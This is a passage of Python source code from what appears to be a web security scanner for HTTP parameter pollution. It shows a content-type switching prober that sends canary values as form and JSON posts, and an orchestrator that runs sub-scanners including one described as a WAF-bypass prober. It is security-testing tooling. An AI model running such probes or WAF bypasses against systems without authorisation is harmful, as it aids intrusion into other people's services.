                        "form_status": form_result.status_code if form_result else None,
                        "json_status": json_result.status_code if json_result else None,
                        "form_reflected": form_reflected,
                        "json_reflected": json_reflected,
                        "winning_content_type": winning_type,
                    },
                    "remediation": (
                        "Apply identical input validation and access control regardless of Content-Type. "
                        "Do not rely on Content-Type to gate security checks."
                    ),
                }
                findings.append(finding)
                self.report_finding(**finding)

            elif form_reflected and json_reflected:
                # Both reflected — both endpoints accept canary, informational
                finding = {
                    "vuln_type": "Content-Type Switching — Canary Reflected in Both Formats",
                    "url": target,
                    "param": name,
                    "payload": f"{name}={canary}",
                    "severity": "Informational",
                    "description": (
                        f"Parameter '{name}' canary is reflected in both form and JSON responses. "
                        "Both content-type paths process the parameter similarly."
                    ),
                    "evidence": {
                        "technique": "content_type_switching",
                        "param": name,
                        "canary": canary,
                        "form_reflected": True,
                        "json_reflected": True,
                    },
                }
                findings.append(finding)
                self.report_finding(**finding)

        return findings

    def _send_form(self, url: str, name: str, canary: str):
        """Send POST with application/x-www-form-urlencoded and return response or None."""
        body = urlencode([(name, canary)])
        try:
            return self.session.post(
                url,
                data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[ContentTypeSwitch] form send error: %r", exc)
            return None

    def _send_json(self, url: str, name: str, canary: str):
        """Send POST with application/json and return response or None."""
        payload = json.dumps({name: canary})
        try:
            return self.session.post(
                url,
                data=payload.encode(),
                headers={"Content-Type": "application/json"},
                timeout=7,
                verify=False,
                allow_redirects=True,
            )
        except Exception as exc:
            logger.debug("[ContentTypeSwitch] json send error: %r", exc)
            return None


# ===========================================================================
# 6. ParamPollutionScanner — Orchestrator
# ===========================================================================

class ParamPollutionScanner(BaseScanner):
    """
    Orchestrates all HPP sub-scanners:
      1. ServerParseProfiler       — fingerprint server parse behavior first
      2. QueryStringHPPProber      — URL query string HPP
      3. PostBodyHPPProber         — POST body HPP (URL-enc, JSON, multipart, GET+POST)
      4. HPPWAFBypassProber        — WAF bypass via HPP (full + split payloads)
      5. ContentTypeSwitchingProber — Form vs JSON content-type parsing discrepancy
    """

    name = "param_pollution"

    def run(self, target: str, **kwargs) -> List[Dict]:
        """Run all HPP probers and return aggregated findings."""
        all_findings: List[Dict] = []

        # Step 1: Profile server parse behavior (informs severity of other findings)
        profiler = ServerParseProfiler(
            session=self.session, results=self.results, debug=self.debug
        )
        try:
            profile_findings = profiler.run(target, **kwargs)
            all_findings.extend(profile_findings)
        except Exception as exc:
            logger.warning("[ParamPollution] ServerParseProfiler failed: %r", exc)

        # Step 2: Query string HPP
        query_prober = QueryStringHPPProber(
            session=self.session, results=self.results, debug=self.debug
        )
        try:
            query_findings = query_prober.run(target, **kwargs)
            all_findings.extend(query_findings)
        except Exception as exc:
            logger.warning("[ParamPollution] QueryStringHPPProber failed: %r", exc)

        # Step 3: POST body HPP (URL-encoded, JSON, multipart, GET+POST)
        post_prober = PostBodyHPPProber(
            session=self.session, results=self.results, debug=self.debug
        )
        try:
            post_findings = post_prober.run(target, **kwargs)
            all_findings.extend(post_findings)
        except Exception as exc:
            logger.warning("[ParamPollution] PostBodyHPPProber failed: %r", exc)

        # Step 4: WAF bypass via HPP (full payloads + split payload technique)
        waf_prober = HPPWAFBypassProber(
            session=self.session, results=self.results, debug=self.debug
        )
        try:
            waf_findings = waf_prober.run(target, **kwargs)
            all_findings.extend(waf_findings)
        except Exception as exc:
            logger.warning("[ParamPollution] HPPWAFBypassProber failed: %r", exc)

        # Step 5: Content-Type switching discrepancy
        ct_prober = ContentTypeSwitchingProber(
            session=self.session, results=self.results, debug=self.debug
        )
        try:
            ct_findings = ct_prober.run(target, **kwargs)
            all_findings.extend(ct_findings)
        except Exception as exc:
            logger.warning("[ParamPollution] ContentTypeSwitchingProber failed: %r", exc)

        self.set_summary("param_pollution", len(all_findings))
        logger.info(
            "[ParamPollution] Scan complete for %s — %d finding(s)",
            target,
            len(all_findings),
        )
        return all_findings


# ===========================================================================
# Module-level adapter
# ===========================================================================

def run(
    url: str,
    session=None,
    results: dict = None,
    debug: bool = False,
    **kwargs,
) -> list:
    """Module-level entry point for the scan engine."""
    scanner = ParamPollutionScanner(
        session=session, results=results or {}, debug=debug
    )
    return scanner.run(url, **kwargs)
